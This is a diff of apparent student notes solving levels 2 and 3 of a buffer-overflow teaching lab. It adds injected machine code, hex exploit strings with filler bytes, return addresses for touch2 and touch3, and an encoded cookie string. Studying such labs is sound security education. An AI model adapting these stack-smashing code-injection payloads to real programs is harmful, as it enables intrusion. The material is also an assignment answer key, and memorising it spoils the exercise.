@@ -24,15 +24,15 @@ c0 17 40 00 00 00 00 00 /* touch1 address */
 
 <ins> Exploit code:
 ```
-   0:	bf fa 97 b9 59       	mov    $0x59b997fa,%edi
+   0:	bf fa 97 b9 59       	mov    $0x59b997fa, %edi    // Cookie value
    5:	c3                   	ret    
 ```
 
 <ins> Format: 
-  1. 0x28 filler
-  2. address of exploit code  <- %rsp on getbuf ret
-  3. address of touch2        <- %rsp on exploit code ret
-  4. exploit code
+  1. Filler
+  2. Address of exploit code, *%rsp on getbuf ret
+  3. Address of touch2, *%rsp on exploit code ret
+  4. Exploit code
 
 - Exploit code address: getbuf starting %rsp + 16 = 0x55685fc0 + 0x10 = 0x55685fd0
 
@@ -46,4 +46,38 @@ c0 17 40 00 00 00 00 00 /* touch1 address */
 d0 5f 68 55 00 00 00 00 /* exploit code address */
 ec 17 40 00 00 00 00 00 /* touch2 address */
 bf fa 97 b9 59 c3       /* exploit code */
+```
+
+## Level 3
+- touch3 address: 00000000004018fa
+
+<ins> Format: 
+  1. Filler
+  2. Address of exploit code
+  4. Address of touch3
+  5. Cookie string, 9 bytes
+  6. Exploit code
+
+- Exploit code address: getbuf starting %rsp + 16 + 9 = 0x55685fd9
+- Cookie string: "59b997fa" -> hex -> 35 39 62 39 39 37 66 61 00
+- Cookie string address: getbuf starting %rsp + 16 = 0x55685fd0
+
+<ins> Exploit code:
+```
+   0:	bf d0 5f 68 55       	mov    $0x55685fd0, %edi      // Set argument 1 to point to cookie string (upper 32 bits set to 0)
+   5:	c3                   	ret    
+```
+
+**String**:
+```
+00 00 00 00 00 00 00 00 /* 0x28 filler characters */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d9 5f 68 55 00 00 00 00 /* exploit code address */
+fa 18 40 00 00 00 00 00 /* touch3 address */
+35 39 62 39 39 37 66 61 /* cookie string */
+00
+bf d0 5f 68 55 c3       /* exploit code */
 ```
